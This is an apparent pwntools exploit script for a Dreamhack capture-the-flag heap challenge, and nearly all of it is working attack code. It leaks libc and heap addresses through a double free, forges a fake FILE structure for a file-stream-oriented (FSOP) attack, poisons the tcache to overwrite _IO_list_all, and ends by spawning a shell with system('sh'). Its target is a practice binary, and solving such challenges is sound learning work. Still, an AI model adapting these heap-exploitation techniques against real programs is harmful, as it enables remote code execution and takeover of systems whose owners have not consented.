#!/usr/bin/env python3
from pwn import *

PORT = 23569
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001422
            brva 0x000000000000153D
            brva 0x0000000000001681
            brva 0x0000000000001898
            brva 0x00000000000017A6
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)
def sl(dt): p.sendline(pr, dt)
def s(dt): p.send(pr, dt)

def menu(i): sla(b'> ', str(i).encode())

def create(i, sz, name, ct):
    menu(1)
    sla(b'> ', str(i).encode())
    sla(b'> ', str(sz).encode())
    sa(b'> ', name)
    sa(b'> ', ct)

def delete(i):
    menu(2)
    sla(b'> ', str(i).encode())

def edit(i, name, ct):
    menu(3)
    sla(b'> ', str(i).encode())
    sa(b'> ', name)
    sa(b'> ', ct)

def show(i):
    menu(4)
    sla(b'> ', str(i).encode())


# Leak heap + libc
create(0, 0x450, b'A'*8, b'a'*0x100)
create(1, 0x40, b'B'*8, b'b'*0x100)
delete(0)
delete(0)

show(0)
p.recvuntil(b'name : ')
libc.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x21ace0 
p.recvuntil(b'content : ')
heap = u64(p.recvn(5).ljust(8, b'\x00'))

log.info(f'libc: {hex(libc.address)}')
log.info(f'heap_key: {hex(heap)}')

# FSOP

chunk1 = (heap<<12) + 0x870

ff = flat({
    0x0: b'  sh\x00\x00\x00\x00',
    0x20: 0,  # write_base
    0x28: 1,  # write_ptr
    0x68: libc.sym.system,  # wide_vtable[0x68]
    0x88: chunk1 + 0x200,  #_lock
    0xa0: chunk1,          # _wide_data
    0xd8: libc.sym._IO_wfile_jumps,  # vtable
    0xe0: chunk1           # wide_vtable
    }, filler = b'\x00')

edit(1, b'fake file', ff)

create(2, 0x100, b'C'*8, b'c'*0x100)
delete(2)
delete(2)

# GDB()
edit(2, p64(heap ^ libc.sym._IO_list_all), p64(heap))
create(3, 0x100, p64(chunk1), b'fsop')
menu(5)
p.interactive()